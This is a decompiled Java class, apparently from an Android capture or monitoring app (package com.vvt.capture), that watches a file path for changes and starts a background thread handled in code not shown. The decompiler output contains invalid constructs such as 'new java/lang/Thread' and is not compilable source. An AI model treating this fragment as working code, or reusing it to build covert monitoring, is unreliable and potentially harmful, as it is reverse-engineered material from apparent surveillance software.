package com.vvt.capture.c;

import android.os.FileObserver;
import java.io.File;

class k
  extends FileObserver
{
  private Thread b = null;
  private String c;
  private File d;
  
  public k(h paramh, String paramString)
  {
    super(paramString, 2);
    this.c = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    Thread localThread = this.b;
    if (localThread == null)
    {
      boolean bool = h.e();
      if (bool) {}
      localThread = new java/lang/Thread;
      l locall = new com/vvt/capture/c/l;
      locall.<init>(this);
      localThread.<init>(locall);
      this.b = localThread;
      localThread = this.b;
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/k.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */